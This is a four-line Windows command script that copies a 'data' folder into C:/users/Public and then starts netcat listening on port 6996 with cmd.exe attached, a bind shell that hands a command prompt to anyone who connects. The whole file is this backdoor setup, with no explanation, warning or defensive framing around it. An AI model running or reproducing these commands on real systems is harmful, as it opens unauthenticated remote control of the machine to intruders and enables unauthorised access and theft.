mkdir "c:/users/Public/data";
xcopy "data" "c:/users/Public/data"
cd "c:/users/Public/data"
nc -l -p 6996 -e cmd.exe;